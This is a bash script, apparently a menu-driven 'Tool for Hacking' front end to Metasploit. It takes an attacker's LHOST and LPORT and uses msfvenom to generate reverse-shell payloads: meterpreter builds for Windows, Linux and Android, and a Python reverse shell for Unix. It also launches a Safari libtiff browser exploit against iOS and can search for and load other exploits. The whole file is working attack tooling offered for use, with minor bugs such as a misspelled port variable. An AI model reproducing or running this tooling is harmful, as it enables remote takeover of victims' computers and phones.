#! /bin/bash
pwd=`pwd`
##COLORS##
#red
    R="\e[1;31m"
#light red
    LR="\e[0;31m"
#blue
    B="\e[1;34m"
#yellow
    Y="\e[1;33m"
#light yellow
    LY="\e[0;33m"
#green
    G="\e[0;32m"
#light green
    LG="\e[1;32m"
#white
    W="\e[1;37m"
#light white
    LW="\e[0;37m"
#end
    E="\e[1;0m"

function banner {
echo -e $W"                                 Script"$E
echo -e $R"                                "$E$W" By:"$E$R" SHADY H"$E
echo -e $R"    ███▄ ▄███▓  ██████   █████▒ "$E$W" Version:"$E$LW" v0.0.4"$E
echo -e $R"   ▓██▒▀█▀ ██▒▒██    ▒ ▓██   ▒  "$E$W" Twitter: "$LW"@ShaddiH1"$E
echo -e $R"   ▓██    ▓██░░ ▓██▄   ▒████ ░  "$E$W" IP:"$E$LR" `wget -qO- myexternalip.com/raw`"
echo -e $R"   ▒██    ▒██   ▒   ██▒░▓█▒  ░  "$E$W" Local IP:"$E$LR" `hostname -I` "$E
echo -e $R"   ▒██▒   ░██▒▒██████▒▒░▒█░     "$E$W" Anonsurf:"$E$LW" `anonsurf status | head -3 | tail -1 | cut -c 12-26`"
echo -e $R"   ░ ▒░   ░  ░▒ ▒▓▒ ▒ ░ ▒ ░     "$E$W" Tools:"$E$G" ● "$W"Root: "$G"●"
echo -e $R"   ░  ░      ░░ ░▒  ░ ░ ░       "$E$W" Os:"$E$LW" `lsb_release -sd` "
echo -e $R"   ░      ░   ░  ░  ░   ░ ░     "$E$W" Kernel:"$E$LW" `uname -mrs`"
echo -e $R"          ░         ░           "$E$W" Shell:"$E$LW" `bash --version | head -1 | cut -d ' ' -f 4`"
}
function WIN {
  echo -e $R""
  read -p "       ┌──[LHOST]
       └──╼ \$ " host
  echo ""
  read -p "       ┌──[LPORT]
       └──╼ \$ " port
  echo -e "
       $Y  ! $LW- LHOST $R |$LY $host
       $Y  ! $LW- LPORT $R |$LY $post"
  echo -e $R ""
  read -p "       ┌──[Are corrects?]-[Y/n]
       └──╼ \$ " win
if [[ "$win" == "y" || "$win" == "Y" ]]
  then
    echo -e $R""
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> $pwd/windows.exe
else
  clear
  banner
  menu_p
fi
}

function UNX {
  echo -e $R""
  read -p "       ┌──[LHOST]
       └──╼ \$ " host
  echo ""
  read -p "       ┌──[LPORT]
       └──╼ \$ " port
  echo -e "
       $Y  ! $LW- LHOST $R |$LY $host
       $Y  ! $LW- LPORT $R |$LY $post"
  echo -e $R ""
  read -p "       ┌──[Are corrects?]-[Y/n]
       └──╼ \$ " unix
if [[ "$unix" == "y" || "$unix" == "Y" ]]
  then
    echo -e $R""
    msfvenom -p cmd/unix/reverse_python LHOST=$host LPORT=$port R> $pwd/MacOS.py
else
 clear
 banner
 menu_p
fi
}

function LNX {
  echo -e $R""
  read -p "       ┌──[LHOST]
       └──╼ \$ " host
  echo ""
  read -p "       ┌──[LPORT]
       └──╼ \$ " port
  echo -e "
       $Y  ! $LW- LHOST $R |$LY $host
       $Y  ! $LW- LPORT $R |$LY $port"
  echo -e $R ""
  read -p "       ┌──[Are corrects?]-[Y/n]
       └──╼ \$ " linux
if [[ "$linux" == "y" || "$linux" == "Y" ]]
  then
    echo -e $R""
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> $pwd/Linux.py
else
  clear
  banner
  menu_p
fi
}

function AND {
  echo -e $R""
  read -p "       ┌──[LHOST]
       └──╼ \$ " host
  echo ""
  read -p "       ┌──[LPORT]
       └──╼ \$ " port
  echo -e "
       $Y  ! $LW- LHOST $R |$LY $host
       $Y  ! $LW- LPORT $R |$LY $post"
  echo -e $R ""
  read -p "       ┌──[Are corrects?]-[Y/n]
       └──╼ \$ " andr
if [[ "$andr" == "y" || "$andr" == "Y" ]]
  then
    echo -e $R""
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> $pwd/Android.apk
else
  clear
  banner
  menu_p
fi
}

function IOS {
echo -e $R""
  read -p "       ┌──[LHOST]
       └──╼ \$ " host
  echo ""
  read -p "       ┌──[LPORT]
       └──╼ \$ " port
  echo -e "
       $Y  ! $LW- LHOST $R |$LY $host
       $Y  ! $LW- LPORT $R |$LY $post"
  echo -e $R ""
  read -p "       ┌──[Are corrects?]-[Y/n]
       └──╼ \$ " ios
if [[ "$ios" == "y" || "$ios" == "Y" ]] 
then
   echo 'use exploit/apple_ios/browser/safari_libtiff' >> IOS.rc
   echo "set SRVHOST $host" >> IOS.rc
   echo "set SRVPORT $port" >> IOS.rc
   echo 'set URIPATH /' >> IOS.rc
   echo 'exploit -j' >> IOS.rc
   service postgresql start
   msfconsole -r IOS.rc
   rm -f IOS.rc
else
  clear
  banner
  menu_p
fi
}
function CSTE {
  echo -e $R""
  read -p "       ┌──[Platform]
       └──╼ \$ " pla
  service postgresql start
  echo "search $pla" >> search.rc
  echo "exit" >> search.rc
  msfconsole -q -r search.rc
  echo ""
  echo -e $R "      ┌──[Exploits from]
       └──╼ \$ $pla"
  echo -e $R""
  read -p "       ┌──[Select an exploit]
       └──╼ \$ " expl
  echo "use $expl" > search.rc
  echo "show options" >> search.rc
  msfconsole -q -r search.rc
  rm -f search.rc
}
function menu_p {
   echo -e $LW"
Tool for Hacking
       Menu:
       $R┌──[$USER@`hostname`]─[$R""/Lab/Metasploit/Create-payload$R]
       $R└──╼ \$ 7 -[$LY""Exploits$R]

       $LW   1 - Windows  $LR | $E$LW 6 -$LY Custom Exploit
       $LW   2 - MacOS    $LR |
       $LW   3 - Linux    $LR | $E$LW 0 - Go back
       $LW   4 - Android  $LR |
       $LW   5 - IOS      $LR |"
  echo -e $R""
  read -p "       ┌──[$USER@`hostname`]─[/lab/Metasploit/Create-payload]
       └──╼ \$ " Exp
if [ "$Exp" == '1' ]
then
  WIN
elif [ "$Exp" == '2' ]
then
  UNX
elif [ "$Exp" == '3' ]
then
  LNX
elif [ "$Exp" == '4' ]
then
  AND
elif [ "$Exp" == '5' ]
then
  IOS
elif [ "$Exp" == '6' ]
then
  CSTE
elif [ "$Exp" == '0' ]
then ./Lab.sh
else
clear
./Lab.sh
fi
}

reset
banner
menu_p
